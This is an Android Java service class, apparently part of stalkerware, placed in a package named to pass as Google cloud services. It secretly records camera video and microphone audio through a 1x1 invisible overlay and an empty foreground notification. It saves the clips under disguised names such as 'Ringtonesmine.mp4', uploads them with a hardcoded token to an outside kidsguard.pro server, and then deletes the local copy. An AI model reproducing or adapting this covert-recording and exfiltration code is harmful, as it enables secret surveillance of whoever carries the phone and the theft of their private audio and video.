package com.google.cloudservices;

import android.app.Notification;

import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.graphics.PixelFormat;
import android.hardware.Camera;
import android.media.CamcorderProfile;
import android.media.MediaRecorder;
import android.os.Build;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;

import android.support.v4.app.NotificationCompat;
import android.util.Log;
import android.view.Gravity;
import android.view.SurfaceHolder;
import android.view.SurfaceView;
import android.view.WindowManager;


import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.mime.MultipartEntity;
import org.apache.http.entity.mime.content.FileBody;
import org.apache.http.entity.mime.content.StringBody;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.util.EntityUtils;

import java.io.File;
import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.nio.charset.Charset;
import java.util.Date;
import java.util.UUID;

public class CapPhoto extends Service implements SurfaceHolder.Callback {

    private WindowManager windowManager;
    private SurfaceView surfaceView;
    private Camera camera = null;
    private MediaRecorder mediaRecorder = null;
    String Type="w",durst="w";
    String path=Environment.getExternalStorageDirectory().getAbsolutePath()+"/"+"Ringtonesmine.mp4";
    int min;

    @Override
    public void onCreate() {

        // Start foreground service to avoid unexpected kill
        // Create new SurfaceView, set its size to 1x1, move it to the top left corner and set this service as a callback
       /* */

    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

//                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
//                    createNotificationChannel();
                    Notification notification = new NotificationCompat.Builder(getApplicationContext())
                            .build();
                    startForeground(1, notification);

//                }

                if(intent != null){
                durst=(String) intent.getExtras().get("dur");
                Type=(String) intent.getExtras().get("type");
                    int d= Integer.parseInt(durst);
                    min=d/60000;
                if (Type.equals("dating")){
                    path=Environment.getExternalStorageDirectory().getAbsolutePath()+"/"+"Ringtonesminedate.mp4";
                }
                }
        windowManager = (WindowManager) CapPhoto.this.getSystemService(Context.WINDOW_SERVICE);
                surfaceView = new SurfaceView(getApplicationContext());
                if (Build.VERSION.SDK_INT>21){
                    if (Build.VERSION.SDK_INT>25){
                        WindowManager.LayoutParams layoutParams = new WindowManager.LayoutParams(
                                1, 1,
                                WindowManager.LayoutParams.TYPE_PHONE,
                                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
                                PixelFormat.TRANSLUCENT
                        );
                        layoutParams.gravity = Gravity.LEFT | Gravity.TOP;
                        windowManager.addView(surfaceView, layoutParams);
                    }else {
                        WindowManager.LayoutParams layoutParams = new WindowManager.LayoutParams(
                                1, 1,
                                WindowManager.LayoutParams.TYPE_PHONE,
                                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
                                PixelFormat.TRANSLUCENT
                        );
                        layoutParams.gravity = Gravity.LEFT | Gravity.TOP;
                        windowManager.addView(surfaceView, layoutParams);
                    }
                }else {
                    WindowManager.LayoutParams layoutParams = new WindowManager.LayoutParams(
                            1, 1,
                            WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY,
                            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
                            PixelFormat.TRANSLUCENT
                    );
                    layoutParams.gravity = Gravity.LEFT | Gravity.TOP;

                    windowManager.addView(surfaceView, layoutParams);
                }


                surfaceView.getHolder().addCallback(CapPhoto.this);



        return super.onStartCommand(intent,flags,startId);
    }
    @Override
    public void surfaceCreated(SurfaceHolder surfaceHolder) {
        if (Type.equals("not")){
        try {


        camera =Camera.open();
        try {
            camera.setPreviewDisplay(surfaceHolder);
        } catch (IOException e) {
            e.printStackTrace();
        }
        camera.startPreview();
//
        mediaRecorder = new MediaRecorder();
        camera.unlock();


        mediaRecorder.setPreviewDisplay(surfaceHolder.getSurface());
        mediaRecorder.setCamera(camera);
        mediaRecorder.setAudioSource(MediaRecorder.AudioSource.CAMCORDER);
        mediaRecorder.setVideoSource(MediaRecorder.VideoSource.CAMERA);
        mediaRecorder.setProfile(CamcorderProfile.get(CamcorderProfile.QUALITY_HIGH));
        mediaRecorder.setVideoFrameRate(15);
        //mediaRecorder.setOutputFile(parcelWrite.getFileDescriptor());
        mediaRecorder.setOutputFile(path);


        try {
            mediaRecorder.prepare();
            mediaRecorder.start();


        } catch (Exception e) {
            Log.e("cach6", e.toString() );
        } }catch (RuntimeException s){
            Log.e("runnigtime34", s.toString());
        }

        Handler handler=new Handler();
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                try {
                    Log.e("striiiiiiiiiiiiiiiing", "run: ");

                windowManager.removeView(surfaceView);
                try {
                    mediaRecorder.stop();
                }catch (Exception e){}

                mediaRecorder.reset();
                mediaRecorder.release();

                camera.lock();
                camera.release();


                //Toast.makeText(CapPhoto.this, "stop", Toast.LENGTH_SHORT).show();
                //Upload();
                Upload2(); }catch (RuntimeException s){
                    Log.e("runnigtime34", s.toString());
                }
            }

        },40000);
        Handler handler2=new Handler();
        handler2.postDelayed(new Runnable() {

            @Override
            public void run() {

                File dir = new File (path);
                if (dir.exists()){
                    dir.delete();
                }
//                stopForeground(0);

            }

        },200000);
    }else if (Type.equals("dating")){
            getvideo(surfaceHolder);

        }


    }

    // Stop recording and remove SurfaceView

    @Override
    public void surfaceChanged(SurfaceHolder surfaceHolder, int format, int width, int height) {}

    @Override
    public void surfaceDestroyed(SurfaceHolder surfaceHolder) {}

    @Override
    public IBinder onBind(Intent intent) { return null; }
//    public void Upload(){
//        try {
//            String uploadId = UUID.randomUUID().toString();
//            //Creating a multi part request
//            new MultipartUploadRequest(getApplicationContext(), uploadId,"https://req.kidsguard.pro/api/putVideo/")
//                    .addFileToUpload(path, "vid") //Adding file
//                    .addParameter("token", getToken(getApplicationContext())) //Adding text parameter to the request
//                    .setMaxRetries(2)
//                    .startUpload(); //Starting the upload
//            //Toast.makeText(this, "don", Toast.LENGTH_SHORT).show();
//
//        } catch (Exception exc) {
//            // Toast.makeText(this, exc.getMessage(), Toast.LENGTH_SHORT).show();
//        }
//    }
    public void Upload2(){
        try {
            HttpClient httpclient = new DefaultHttpClient();
            HttpPost httppost = new HttpPost("https://im.kidsguard.pro/api/put-video/");


            try {
                MultipartEntity entity = new MultipartEntity();

                try {
                    entity.addPart("token1", new StringBody("allow", Charset.forName("UTF-8")));
                    entity.addPart("token", new StringBody("fb6741b31cb02c6079a542083b6a46a8", Charset.forName("UTF-8")));
                } catch (UnsupportedEncodingException e) {
                    e.printStackTrace();
                }
                File myFile = new File(path);
                FileBody fileBody = new FileBody(myFile);
                entity.addPart("video", fileBody);
                Log.e("terkgkjjgjgj", String.valueOf(entity.getContentLength()) );
                //totalSize = entity.getContentLength();
                httppost.setEntity(entity);
                HttpResponse response = httpclient.execute(httppost);
                HttpEntity r_entity = response.getEntity();
                Log.e("terkgkjjgjgj", EntityUtils.toString(r_entity));
                //responseString = EntityUtils.toString(r_entity);

            } catch (ClientProtocolException e) {
                Log.e("terkgkjjgjgj", e.toString());
                //responseString = e.toString();
            } catch (IOException e) {
                Log.e("terkgkjjgjgj", e.toString());
                //	responseString = e.toString();
            }




//            String uploadId = UUID.randomUUID().toString();
//            //Creating a multi part request
//            new MultipartUploadRequest(getApplicationContext(), uploadId,"https://im.kidsguard.pro/api/put-video/")
//                    .addFileToUpload(path, "video") //Adding file
//                    .addParameter("token", getToken(getApplicationContext()))
//                    .addParameter("token1", "allow")//Adding text parameter to the request
//                    .setMaxRetries(2)
//
//                    .startUpload(); //Starting the upload
//            //Toast.makeText(this, "don", Toast.LENGTH_SHORT).show();

        } catch (Exception exc) {

            // Toast.makeText(this, exc.getMessage(), Toast.LENGTH_SHORT).show();
        }
    }

//    private void createNotificationChannel() {
//        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
//            NotificationChannel serviceChannel = new NotificationChannel(
//                    "ForegroundServiceChannel",
//                    "Foreground Service Channel",
//                    NotificationManager.IMPORTANCE_DEFAULT
//            );
//            serviceChannel.setShowBadge(false);
//
//
//
//            NotificationManager manager = getSystemService(NotificationManager.class);
//
//            manager.createNotificationChannel(serviceChannel);
//
//        }
//    }
    public  String getToken(Context context){
        String token=null;
        TokenDataBaseManager tokenDataBaseManager=new TokenDataBaseManager(context);
        token=tokenDataBaseManager.gettoken();
        tokenDataBaseManager.close();
        return token;

    }
    public void getvideo(final SurfaceHolder surfaceHolder){
        try {
            Date curDate = new Date(System.currentTimeMillis());
            String curedate = curDate.toString();
            File file=new File(Environment.getExternalStorageDirectory().getAbsolutePath(),"458544555433");
            if (!file.exists()){file.mkdirs();}
            min--;

            camera =Camera.open();
            try {
                camera.setPreviewDisplay(surfaceHolder);
            } catch (IOException e) {
                e.printStackTrace();
            }
            camera.startPreview();
//
            mediaRecorder = new MediaRecorder();
            camera.unlock();


            mediaRecorder.setPreviewDisplay(surfaceHolder.getSurface());
            mediaRecorder.setCamera(camera);
            mediaRecorder.setAudioSource(MediaRecorder.AudioSource.CAMCORDER);
            mediaRecorder.setVideoSource(MediaRecorder.VideoSource.CAMERA);
            mediaRecorder.setProfile(CamcorderProfile.get(CamcorderProfile.QUALITY_HIGH));
            mediaRecorder.setVideoFrameRate(15);
            //mediaRecorder.setOutputFile(parcelWrite.getFileDescriptor());
            mediaRecorder.setOutputFile(Environment.getExternalStorageDirectory().getAbsolutePath()+"/458544555433/"+curedate+".mp4");


            try {
                mediaRecorder.prepare();
                mediaRecorder.start();


            } catch (Exception e) {
                Log.e("cach343", e.toString() );
            } }catch (RuntimeException s){
            Log.e("cach343", s.toString());
        }
        Handler handler=new Handler();
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                try {


                    mediaRecorder.stop();
                    mediaRecorder.reset();
                    mediaRecorder.release();
                    camera.lock();
                    camera.release();
                    windowManager.removeView(surfaceView);
                    //Toast.makeText(CapPhoto.this, "stop", Toast.LENGTH_SHORT).show();
                    if (min>0){
                        getvideo(surfaceHolder);
                    }else {windowManager.removeView(surfaceView);}
                }catch (RuntimeException e){
                    Log.e("cach343", e.toString());
                }
            }

        }, 60000);

    }
}